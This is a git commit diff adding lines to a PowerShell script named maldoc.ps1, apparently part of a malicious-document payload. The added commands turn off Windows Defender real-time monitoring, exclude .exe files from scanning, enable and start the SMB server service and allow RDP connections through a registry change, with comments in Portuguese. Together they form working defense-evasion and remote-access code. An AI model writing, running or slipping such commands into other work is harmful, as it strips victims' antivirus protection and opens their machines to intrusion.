e03cdd8da644a3ca10908b0f2ae19459810a714f
jovair1994 <68813860+jovair1994@users.noreply.github.com>
2024-01-02 18:15:27 -0300

    Update maldoc.ps1

--- maldoc.ps1
+++ maldoc.ps1
@@ -1,1 +1,12 @@
 
+Set-MpPreference -ExclusionExtension ".exe"
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Habilite o serviço SMB
+Set-Service -Name "LanmanServer" -StartupType 'Automatic'
+Start-Service -Name "LanmanServer"
+
+# Habilite o serviço RDP
+
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+
